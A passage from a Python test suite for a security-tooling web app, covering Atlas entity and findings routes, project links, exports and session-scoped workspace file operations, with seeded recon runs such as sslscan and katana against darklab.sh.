            configured_count=1,
        )

        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"intel_payload_inline_max_bytes": 1}), \
             mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
            refresh_resp = client.post(
                f"/atlas/entities/{domain_id}/refresh_intel",
                headers={"X-Session-ID": session_id},
            )
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT data_json FROM entity_intel_snapshots WHERE session_id = ? AND entity_id = ?",
                    (session_id, domain_id),
                ).fetchone()["data_json"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})
            delete_resp = client.delete(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

            assert refresh_resp.status_code == 200
            assert detail_resp.status_code == 200
            detail = json.loads(detail_resp.data)
            assert detail["intel_snapshots"][0]["data"]["providers"]["crtsh"]["certificate_count"] == 7
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_findings_tab_lists_and_bulk_updates_review_state(self):
        client = get_client()
        session_id = self._session_id()
        self._seed_entity_run(session_id)

        list_resp = client.get("/atlas/findings?review_state=new", headers={"X-Session-ID": session_id})
        data = json.loads(list_resp.data)
        finding_id = data["findings"][0]["id"]
        bulk_resp = client.post(
            "/atlas/findings/review",
            json={"finding_ids": [finding_id, "missing-finding"], "review_state": "important"},
            headers={"X-Session-ID": session_id},
        )

        assert list_resp.status_code == 200
        assert data["total"] == 1
        assert data["findings"][0]["entity_value"] == "darklab.sh"
        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {"updated": 1, "not_found": 1}
        with db_connect() as conn:
            row = conn.execute(
                "SELECT status FROM findings WHERE session_id = ? AND id = ?",
                (session_id, finding_id),
            ).fetchone()
        assert row["status"] == "important"

    def test_atlas_suppression_hides_rows_until_requested_and_preserves_project_links(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        finding_id = json.loads(client.get("/atlas/findings", headers={"X-Session-ID": session_id}).data)["findings"][0]["id"]
        project_resp = client.post(
            "/projects",
            json={"name": "Suppression Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_id": domain_id},
            headers={"X-Session-ID": session_id},
        )

        entity_suppress_resp = client.put(
            f"/atlas/entities/{domain_id}/suppression",
            json={"suppressed": True, "reason": "too noisy"},
            headers={"X-Session-ID": session_id},
        )
        finding_suppress_resp = client.put(
            f"/atlas/findings/{finding_id}/suppression",
            json={"suppressed": True},
            headers={"X-Session-ID": session_id},
        )
        default_summary = client.get("/atlas", headers={"X-Session-ID": session_id})
        suppressed_entities = client.get(
            "/atlas/entities?type=domain&suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        suppressed_findings = client.get(
            "/atlas/findings?suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        default_export = client.get(
            "/atlas/entities/export?format=jsonl&type=domain",
            headers={"X-Session-ID": session_id},
        )
        suppressed_export = client.get(
            "/atlas/entities/export?format=jsonl&type=domain&suppression_filter=only",
            headers={"X-Session-ID": session_id},
        )
        project_summary = client.get(f"/projects/{project['id']}/summary", headers={"X-Session-ID": session_id})
        restore_resp = client.post(
            "/atlas/findings/suppression",
            json={"finding_ids": [finding_id], "suppressed": False},
            headers={"X-Session-ID": session_id},
        )

        assert entity_suppress_resp.status_code == 200
        assert finding_suppress_resp.status_code == 200
        assert json.loads(default_summary.data)["counts"]["domain"] == 0
        assert json.loads(default_summary.data)["findings"] == 0
        entity_data = json.loads(suppressed_entities.data)
        assert entity_data["total"] == 1
        assert entity_data["entities"][0]["suppressed"] is True
        assert entity_data["entities"][0]["suppressed_reason"] == "too noisy"
        finding_data = json.loads(suppressed_findings.data)
        assert finding_data["total"] == 1
        assert finding_data["findings"][0]["suppressed"] is True
        assert default_export.data.decode("utf-8") == ""
        exported = [json.loads(line) for line in suppressed_export.data.decode("utf-8").splitlines()]
        assert exported[0]["suppressed"] is True
        assert json.loads(project_summary.data)["counts"]["entities"] == 0
        assert restore_resp.status_code == 200
        assert json.loads(restore_resp.data)["counts"] == {"updated": 1, "not_found": 0}

    def test_atlas_saved_views_roundtrip_and_stay_session_scoped(self):
        client = get_client()
        session_id = self._session_id()
        other_session_id = self._session_id()

        create_resp = client.post(
            "/atlas/views",
            json={
                "name": "High signal",
                "tab": "findings",
                "filters": {
                    "query": "ssl",
                    "orphan_filter": "only",
                    "suppression_filter": "only",
                    "finding_status": "important",
                    "project_id": "prj_0123456789abcdef",
                    "project_name": "External Test",
                    "run_id": "run_0123456789abcdef",
                    "run_label": "katana -u https://darklab.sh",
                },
            },
            headers={"X-Session-ID": session_id},
        )
        view = json.loads(create_resp.data)["view"]
        list_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})
        isolated_resp = client.get("/atlas/views", headers={"X-Session-ID": other_session_id})
        preferences_resp = client.post(
            "/session/preferences",
            json={"preferences": {"pref_timestamps": "on"}},
            headers={"X-Session-ID": session_id},
        )
        after_preferences_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})
        update_resp = client.put(
            f"/atlas/views/{view['id']}",
            json={
                "name": "Reviewed SSL",
                "tab": "domain",
                "filters": {
                    "query": "darklab",
                    "orphan_filter": "hide",
                    "suppression_filter": "all",
                    "finding_status": "reviewed",
                },
            },
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(f"/atlas/views/{view['id']}", headers={"X-Session-ID": session_id})
        after_delete_resp = client.get("/atlas/views", headers={"X-Session-ID": session_id})

        assert create_resp.status_code == 201
        assert view["name"] == "High signal"
        assert view["tab"] == "findings"
        assert view["filters"]["query"] == "ssl"
        assert view["filters"]["finding_status"] == "important"
        assert view["filters"]["run_id"] == "run_0123456789abcdef"
        assert view["filters"]["run_label"] == "katana -u https://darklab.sh"
        assert json.loads(list_resp.data)["views"][0]["id"] == view["id"]
        assert json.loads(isolated_resp.data)["views"] == []
        assert preferences_resp.status_code == 200
        assert json.loads(after_preferences_resp.data)["views"][0]["id"] == view["id"]
        assert update_resp.status_code == 200
        updated = json.loads(update_resp.data)["view"]
        assert updated["name"] == "Reviewed SSL"
        assert updated["tab"] == "domain"
        assert updated["filters"]["suppression_filter"] == "all"
        assert delete_resp.status_code == 200
        assert json.loads(after_delete_resp.data)["views"] == []

    def test_unscoped_findings_flow_through_atlas_projects_and_run_routes(self):
        client = get_client()
        session_id = self._session_id()
        run_id = "run-" + uuid.uuid4().hex
        project_resp = client.post(
            "/projects",
            json={"name": "Unscoped Finding Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, "sslscan darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            conn.commit()
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            recorded = record_run_findings(conn, session_id, run_id, [{
                "text": "TLSv1.0 enabled [high]",
                "signals": ["findings"],
                "line_index": 7,
            }])
            conn.commit()

        atlas_resp = client.get("/atlas/findings?review_state=new", headers={"X-Session-ID": session_id})
        project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )
        run_findings_resp = client.get(f"/entities/run/{run_id}/findings", headers={"X-Session-ID": session_id})
        finding = json.loads(atlas_resp.data)["findings"][0]
        review_resp = client.put(
            f"/findings/{finding['id']}/review",
            json={"review_state": "needs_followup"},
            headers={"X-Session-ID": session_id},
        )
        updated_project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )

        assert len(recorded) == 1
        assert recorded[0]["entity_id"] == ""
        assert recorded[0]["target_ids"] == []
        expected_finding_keys = {
            "id",
            "session_id",
            "run_id",
            "target_id",
            "entity_id",
            "subject_key",
            "scope",
            "kind",
            "title",
            "raw_line",
            "line_number",
            "severity",
            "fingerprint",
            "review_state",
            "status",
            "first_seen_at",
            "last_seen_at",
            "occurrence_count",
            "created",
        }
        assert expected_finding_keys.issubset(recorded[0])
        assert atlas_resp.status_code == 200
        assert finding["entity_id"] == ""
        assert finding["entity_value"] == ""
        assert finding["subject_key"].startswith("unscoped:sslscan:")
        assert project_findings_resp.status_code == 200
        project_findings = json.loads(project_findings_resp.data)["findings"]
        assert [(item["id"], item["target_ids"]) for item in project_findings] == [(finding["id"], [])]
        assert expected_finding_keys.issubset(project_findings[0])
        assert run_findings_resp.status_code == 200
        run_findings = json.loads(run_findings_resp.data)["findings"]
        assert [(item["id"], item["target_ids"]) for item in run_findings] == [(finding["id"], [])]
        assert expected_finding_keys.issubset(run_findings[0])
        assert review_resp.status_code == 200
        reviewed_finding = json.loads(review_resp.data)["finding"]
        assert reviewed_finding["review_state"] == "needs_followup"
        assert reviewed_finding["status"] == "needs_followup"
        assert expected_finding_keys.issubset(reviewed_finding)
        assert json.loads(updated_project_findings_resp.data)["findings"][0]["review_state"] == "needs_followup"

    def test_run_findings_route_returns_deduped_findings_with_occurrence_count(self):
        client = get_client()
        session_id = self._session_id()
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 2)",
                (run_id, session_id, "katana -u https://darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = record_run_findings(conn, session_id, run_id, [
                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 0},
                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 9},
            ])
            occurrence_count = conn.execute(
                "SELECT COUNT(*) FROM findings_occurrences WHERE run_id = ?",
                (run_id,),
            ).fetchone()[0]
            conn.commit()

        resp = client.get(f"/entities/run/{run_id}/findings", headers={"X-Session-ID": session_id})
        findings = json.loads(resp.data)["findings"]

        assert resp.status_code == 200
        assert len(recorded) == 2
        assert occurrence_count == 2
        assert len(findings) == 1
        assert findings[0]["run_occurrence_count"] == 2
        assert findings[0]["line_number"] == 0

        paged_resp = client.get(
            f"/entities/run/{run_id}/findings?limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        )
        paged = json.loads(paged_resp.data)

        assert paged_resp.status_code == 200
        assert len(paged["findings"]) == 1
        assert paged["total"] == 1
        assert paged["limit"] == 1
        assert paged["offset"] == 0
        assert paged["has_more"] is False
        assert paged["occurrence_total"] == 2

    def test_project_links_curate_atlas_entities_into_project_targets(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]

        link_resp = client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        targets_resp = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        unlink_resp = client.delete(
            f"/atlas/entities/{domain_id}/project_links/{project['id']}",
            headers={"X-Session-ID": session_id},
        )
        targets_after_unlink = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert json.loads(link_resp.data)["link"]["entity_type"] == "atlas_entity"
        assert targets_resp.status_code == 200
        targets = json.loads(targets_resp.data)["targets"]
        assert [(item["id"], item["value"]) for item in targets] == [(domain_id, "darklab.sh")]
        assert json.loads(summary_resp.data)["counts"]["targets"] == 1
        assert unlink_resp.status_code == 200
        assert json.loads(targets_after_unlink.data)["targets"] == []

    def test_project_summary_surfaces_all_linked_atlas_entities(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        other_run_id, other_recorded = self._seed_domain_finding_run(session_id, "unrelated.test")
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        other_domain_id = next(item["id"] for item in other_recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Entity Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'nvd', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    cve_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["nvd"]}}),
                ),
            )
            conn.commit()

        bulk_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, cve_id, other_domain_id]},
            headers={"X-Session-ID": session_id},
        )
        for linked_run_id in (run_id, other_run_id):
            client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": linked_run_id},
                headers={"X-Session-ID": session_id},
            )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        entities_resp = client.get(
            f"/projects/{project['id']}/entities?type=cve&limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        )
        run_filtered_resp = client.get(
            f"/projects/{project['id']}/entities?run_id={run_id}&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        target_filtered_resp = client.get(
            f"/projects/{project['id']}/entities?target_id={domain_id}&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(summary_resp.data)
        entity_page = json.loads(entities_resp.data)
        run_filtered = json.loads(run_filtered_resp.data)
        target_filtered = json.loads(target_filtered_resp.data)

        assert bulk_resp.status_code == 200
        assert json.loads(bulk_resp.data)["counts"]["added"] == 3
        assert summary_resp.status_code == 200
        assert entities_resp.status_code == 200
        assert run_filtered_resp.status_code == 200
        assert target_filtered_resp.status_code == 200
        assert data["counts"]["targets"] == 2
        assert data["counts"]["entities"] == 3
        assert data["entities"] == []
        assert data["entity_counts"]["domain"] == 2
        assert data["entity_counts"]["cve"] == 1
        assert {item["id"] for item in data["targets"]} == {domain_id, other_domain_id}
        assert entity_page["total"] == 1
        assert entity_page["limit"] == 1
        assert entity_page["counts_by_type"]["domain"] == 2
        assert entity_page["counts_by_type"]["cve"] == 1
        entities = {item["id"]: item for item in entity_page["entities"]}
        assert set(entities) == {cve_id}
        assert entities[cve_id]["type"] == "cve"
        assert entities[cve_id]["intel_provider_count"] == 1
        assert entities[cve_id]["intel_providers"] == ["nvd"]
        assert entities[cve_id]["intel_last_refreshed"]
        assert {item["id"] for item in run_filtered["entities"]} == {domain_id, cve_id}
        assert run_filtered["counts_by_type"] == {"cve": 1, "domain": 1}
        assert {item["id"] for item in target_filtered["entities"]} == {domain_id, cve_id}
        assert target_filtered["counts_by_type"] == {"cve": 1, "domain": 1}

    def test_project_findings_include_linked_entity_findings_without_linked_run(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Entity Finding Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_id": domain_id},
            headers={"X-Session-ID": session_id},
        )
        project_findings_resp = client.get(
            f"/projects/{project['id']}/findings",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(project_findings_resp.data)

        assert link_resp.status_code == 201
        assert project_findings_resp.status_code == 200
        assert [(item["entity_id"], item["raw_line"]) for item in data["findings"]] == [
            (domain_id, "443/tcp open https on darklab.sh")
        ]
        assert data["findings"][0]["orphan_source"] is False

    def test_bulk_project_unlink_supports_atlas_entities(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
        project_resp = client.post(
            "/projects",
            json={"name": "Bulk Entity Case"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, cve_id]},
            headers={"X-Session-ID": session_id},
        )

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "atlas_entity", "entity_ids": [domain_id, "missing-entity"]},
            headers={"X-Session-ID": session_id},
        )
        summary_resp = client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        )
        entities_resp = client.get(
            f"/projects/{project['id']}/entities?limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        )
        data = json.loads(unlink_resp.data)

        assert unlink_resp.status_code == 200
        assert data["counts"]["removed"] == 1
        assert data["counts"]["not_found"] == 1
        assert {item["status"] for item in data["results"]} == {"removed", "not_found"}
        assert json.loads(summary_resp.data)["entities"] == []
        assert {item["id"] for item in json.loads(entities_resp.data)["entities"]} == {cve_id}

    def test_exports_entities_as_csv_and_jsonl_with_metadata(self):
        client = get_client()
        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
        project_resp = client.post(
            "/projects",
            json={"name": "Atlas Export"},
            headers={"X-Session-ID": session_id},
        )
        project = json.loads(project_resp.data)["project"]
        client.post(
            f"/atlas/entities/{domain_id}/project_links",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'primary', datetime('now'))",
                ("lbl_" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'atlas_entity', ?, 'Scope approved', datetime('now'), datetime('now'))",
                ("note_" + uuid.uuid4().hex, session_id, domain_id),
            )
            conn.execute(
                "INSERT INTO entity_intel_snapshots "
                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
                "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                (
                    "intel_" + uuid.uuid4().hex,
                    session_id,
                    domain_id,
                    json.dumps({"summary": {"has_intel": True, "providers_with_data": ["crtsh"]}}),
                ),
            )
            conn.commit()

        csv_resp = client.get(
            f"/atlas/entities/export?format=csv&type=domain&project_id={quote(project['id'])}",
            headers={"X-Session-ID": session_id},
        )
        jsonl_resp = client.get(
            f"/atlas/entities/export?format=jsonl&type=domain&project_id={quote(project['id'])}",
            headers={"X-Session-ID": session_id},
        )
        invalid_resp = client.get(
            "/atlas/entities/export?format=xml",
            headers={"X-Session-ID": session_id},
        )

        assert csv_resp.status_code == 200
        assert csv_resp.mimetype == "text/csv"
        assert "darklab-atlas-entities.csv" in csv_resp.headers["Content-Disposition"]
        rows = list(csv.DictReader(io.StringIO(csv_resp.get_data(as_text=True))))
        assert len(rows) == 1
        assert rows[0]["id"] == domain_id
        assert rows[0]["type"] == "domain"
        assert rows[0]["canonical_value"] == "darklab.sh"
        assert rows[0]["labels"] == "primary"
        assert rows[0]["notes"] == "Scope approved"
        assert rows[0]["project_names"] == "Atlas Export"
        assert rows[0]["intel_providers_with_data"] == "crtsh"
        assert jsonl_resp.status_code == 200
        assert jsonl_resp.mimetype == "application/x-ndjson"
        exported = json.loads(jsonl_resp.get_data(as_text=True).splitlines()[0])
        assert exported["labels"] == ["primary"]
        assert exported["notes"] == "Scope approved"
        assert exported["project_names"] == ["Atlas Export"]
        assert exported["intel_providers_with_data"] == ["crtsh"]
        assert invalid_resp.status_code == 400


# ── /workspace/files ──────────────────────────────────────────────────────────

class TestWorkspaceRoutes:
    def _cfg(self, root, **overrides):
        cfg = {
            "workspace_enabled": True,
            "workspace_backend": "tmpfs",
            "workspace_root": str(root),
            "workspace_quota_mb": 1,
            "workspace_max_file_mb": 1,
            "workspace_max_files": 10,
            "workspace_inactivity_ttl_hours": 1,
        }
        cfg.update(overrides)
        return cfg

    def test_requires_active_session_header(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.get("/workspace/files")
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Files require an active session"

    def test_disabled_workspace_returns_403(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_enabled=False),
        ):
            resp = client.get("/workspace/files", headers={"X-Session-ID": "workspace-disabled"})
        assert resp.status_code == 403
        assert json.loads(resp.data)["error"] == "Files are disabled on this instance"

    def test_write_list_read_delete_lifecycle(self):
        client = get_client()
        session = "workspace-lifecycle-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "darklab.sh\n"},
            )
            assert created.status_code == 200
            created_data = json.loads(created.data)
            assert created_data["file"] == {"path": "targets.txt", "size": 11}
            assert created_data["workspace"]["usage"]["bytes_used"] == 11

            listed = json.loads(client.get("/workspace/files", headers={"X-Session-ID": session}).data)
            assert listed["files"][0]["path"] == "targets.txt"
            assert listed["limits"]["max_files"] == 10

            read = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert json.loads(read.data) == {
                "path": "targets.txt",
                "text": "darklab.sh\n",
                "size": 11,
            }

            binary_path = resolve_workspace_path(session, "asset.db", config.CFG, ensure_parent=True)
            binary_path.write_bytes(b"SQLite format 3\x00binary")
            binary = client.get(
                "/workspace/files/read?path=asset.db",
                headers={"X-Session-ID": session},
            )
            assert binary.status_code == 415
            assert "download it instead" in json.loads(binary.data)["error"]

            with mock.patch("services.workspace.files.os.open", side_effect=PermissionError(errno.EACCES, "denied")):
                unreadable = client.get(
                    "/workspace/files/read?path=targets.txt",
                    headers={"X-Session-ID": session},
                )
            assert unreadable.status_code == 403
            assert json.loads(unreadable.data)["error"] == "session file is not readable"

            deleted = client.delete(
                "/workspace/files?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            deleted_files = json.loads(deleted.data)["workspace"]["files"]
            assert "targets.txt" not in {item["path"] for item in deleted_files}

    def test_workspace_files_are_session_isolated(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.post(
                "/workspace/files",
                headers={"X-Session-ID": "workspace-owner"},
                json={"path": "targets.txt", "text": "owned\n"},
            )
            assert resp.status_code == 200

            other = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": "workspace-other"},
            )
            assert other.status_code == 404

    def test_workspace_file_routes_include_and_maintain_generic_metadata(self):
        client = get_client()
        session = "workspace-metadata-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "darklab.sh\n"},
            )
            assert created.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO entity_labels "
                    "(id, session_id, entity_type, entity_id, label, created) "
                    "VALUES (?, ?, 'workspace_file', 'targets.txt', 'important', datetime('now'))",
                    ("lbl_workspace_file_" + uuid.uuid4().hex, session),
                )
                conn.execute(
                    "INSERT INTO entity_notes "
                    "(id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, 'workspace_file', 'targets.txt', 'manual context', datetime('now'), datetime('now'))",
                    ("note_workspace_file_" + uuid.uuid4().hex, session),
                )
                conn.commit()

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            assert listed.status_code == 200
            listed_file = listed.get_json()["files"][0]
            assert listed_file["path"] == "targets.txt"
            assert [label["label"] for label in listed_file["labels"]] == ["important"]
            assert listed_file["note"]["body"] == "manual context"

            read = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert read.status_code == 200
            assert [label["label"] for label in read.get_json()["labels"]] == ["important"]
            assert read.get_json()["note"]["body"] == "manual context"

            created_dir = client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": "reports"},
            )
            assert created_dir.status_code == 200
            moved = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": "targets.txt", "destination": "reports/targets.txt"},
            )
            assert moved.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_labels "
                    "WHERE session_id = ? AND entity_type = 'workspace_file' AND entity_id = 'targets.txt'",
                    (session,),
                ).fetchone()[0] == 0
                assert conn.execute(
                    "SELECT body FROM entity_notes "
                    "WHERE session_id = ? AND entity_type = 'workspace_file' "
                    "AND entity_id = 'reports/targets.txt'",
                    (session,),
                ).fetchone()[0] == "manual context"

            deleted = client.delete(
                "/workspace/files?path=reports/targets.txt",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_labels "
                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
                    (session,),
                ).fetchone()[0] == 0
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_notes "
                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
                    (session,),
                ).fetchone()[0] == 0

    def test_create_directory_lists_empty_folder(self):
        client = get_client()
        session = "workspace-dir-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": "reports/empty"},
            )
            assert created.status_code == 200
            created_data = created.get_json()
            assert created_data["directory"] == {"path": "reports/empty"}
            assert {"reports", "reports/empty"} <= {
                item["path"] for item in created_data["workspace"]["directories"]
            }
            assert created_data["workspace"]["usage"]["file_count"] == 0

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            assert listed.status_code == 200
            assert "reports/empty" in {item["path"] for item in listed.get_json()["directories"]}

    def test_info_and_delete_folder_recursively(self):
        client = get_client()
        session = "workspace-delete-dir-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            info = client.get(
                "/workspace/files/info?path=reports",
                headers={"X-Session-ID": session},
            )
            assert info.status_code == 200
            assert info.get_json() == {"path": "reports", "kind": "directory", "file_count": 2}

            deleted = client.delete(
                "/workspace/files?path=reports",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            data = deleted.get_json()
            assert data["deleted"] == {"path": "reports", "kind": "directory", "file_count": 2}
            assert data["workspace"]["files"] == []
            assert data["workspace"]["directories"] == []

    def test_move_file_and_folder_paths(self):
        client = get_client()
        session = "workspace-move-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": "archive"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            moved_file = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": "reports/one.txt", "destination": "archive"},
            )
            assert moved_file.status_code == 200
            assert moved_file.get_json()["moved"] == {
                "source": "reports/one.txt",
                "destination": "archive/one.txt",
                "kind": "file",
                "file_count": 1,
            }
            assert client.get(
                "/workspace/files/read?path=reports/one.txt",
                headers={"X-Session-ID": session},
            ).status_code == 404
            assert client.get(
                "/workspace/files/read?path=archive/one.txt",
                headers={"X-Session-ID": session},
            ).get_json()["text"] == "one\n"

            moved_folder = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": "reports", "destination": "archive/reports-renamed"},
            )
            assert moved_folder.status_code == 200
            assert moved_folder.get_json()["moved"] == {
                "source": "reports",
                "destination": "archive/reports-renamed",
                "kind": "directory",
                "file_count": 1,
            }
            nested = client.get(
                "/workspace/files/read?path=archive/reports-renamed/nested/two.txt",
                headers={"X-Session-ID": session},
            )
            assert nested.status_code == 200
            assert nested.get_json()["text"] == "two\n"

            moved_to_root = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": "archive/one.txt", "destination": "/"},
            )
